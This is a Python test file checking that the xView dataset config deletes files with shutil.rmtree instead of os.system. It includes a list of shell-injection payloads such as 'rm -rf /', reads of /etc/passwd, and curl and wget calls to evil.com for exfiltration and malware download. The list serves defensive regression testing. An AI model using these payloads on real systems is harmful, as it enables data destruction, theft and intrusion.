import pathlib
import shutil
import pytest

XVIEW_YAML_PATH = pathlib.Path(__file__).parent.parent / "data" / "xView.yaml"


def test_xview_yaml_does_not_use_os_system():
    content = XVIEW_YAML_PATH.read_text()
    download_section = content[content.index("download:"):]
    assert "os.system(" not in download_section


def test_xview_yaml_uses_shutil_rmtree():
    content = XVIEW_YAML_PATH.read_text()
    download_section = content[content.index("download:"):]
    assert "shutil.rmtree(" in download_section
    assert "ignore_errors=True" in download_section


@pytest.mark.parametrize("payload", [
    # Command injection via semicolon
    "/tmp/labels; rm -rf /tmp/important_file",
    # Command injection via pipe
    "/tmp/labels | cat /etc/passwd",
    # Command injection via backticks
    "/tmp/labels`whoami`",
    # Command injection via $() subshell
    "/tmp/labels$(id)",
    # Command injection via &&
    "/tmp/labels && curl http://evil.com/exfil",
    # Command injection via ||
    "/tmp/labels || wget http://evil.com/malware",
    # Newline injection
    "/tmp/labels\nrm -rf /",
    # Null byte injection
    "/tmp/labels\x00; rm -rf /",
    # Path traversal with command injection
    "../../etc/passwd; id",
    # Spaces and multiple commands
    "/tmp/labels /etc/shadow",
    # Glob expansion abuse
    "/tmp/labels/*",
    # Tilde expansion
    "~/sensitive_dir",
    # Environment variable injection
    "/tmp/${HOME}/.ssh/authorized_keys",
    # Redirection injection
    "/tmp/labels > /etc/crontab",
    # Heredoc injection
    "/tmp/labels << EOF\nmalicious\nEOF",
    # Double dash to end options
    "-- /tmp/labels; id",
    # Unicode lookalike characters
    "/tmp/lаbels; id",  # Cyrillic 'а'
    # Very long path (buffer overflow attempt)
    "A" * 10000,
    # Whitespace only
    "   ",
    # Empty string
    "",
    # Just a semicolon
    ";",
    # Just a pipe
    "|",
    # Nested subshell
    "/tmp/$($(id))",
    # YAML injection attempt
    "/tmp/labels\n- malicious: value",
    # Shell special chars
    "/tmp/labels`curl http://evil.com`",
    # Absolute path to sensitive file with injection
    "/etc/passwd; echo pwned",
])
def test_shutil_rmtree_does_not_raise_on_injection_payload(payload, tmp_path):
    try:
        shutil.rmtree(tmp_path / payload, ignore_errors=True)
    except ValueError:
        pass  # null bytes and other OS-invalid characters raise ValueError, not shell execution
